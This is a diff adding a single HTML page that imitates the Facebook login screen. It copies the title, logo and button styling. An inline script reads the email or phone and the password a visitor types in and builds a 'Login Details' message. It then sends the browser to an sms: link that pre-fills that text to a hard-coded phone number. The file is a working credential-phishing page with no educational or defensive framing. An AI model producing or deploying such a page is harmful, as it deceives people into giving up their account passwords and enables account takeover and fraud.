@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #165dbb;
+        }
+        .forgot-link {
+            display: block;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            background: #42b72a;
+            padding: 12px;
+            color: white;
+            border: none;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .create-account:hover {
+            background: #36981f;
+        }
+    </style>
+    <script>
+        function redirectToSMS(event) {
+    event.preventDefault(); // Prevent form submission
+
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+
+    var message = `Login Details:\nEmail/Phone: ${email}\nPassword: ${password}`;
+    var encodedMessage = encodeURIComponent(message);
+
+    // Open SMS app with pre-filled text (works only on mobile devices)
+    window.location.href = `sms:+2347025278855?&body=${encodedMessage}`;
+}
+    </script>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-box">
+            <form onsubmit="redirectToSMS(event)">
+                <input type="text" id="email" placeholder="Email or Phone Number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#" class="forgot-link">Forgotten password?</a>
+                <hr>
+                <button type="button" class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+
+</body>
+</html>
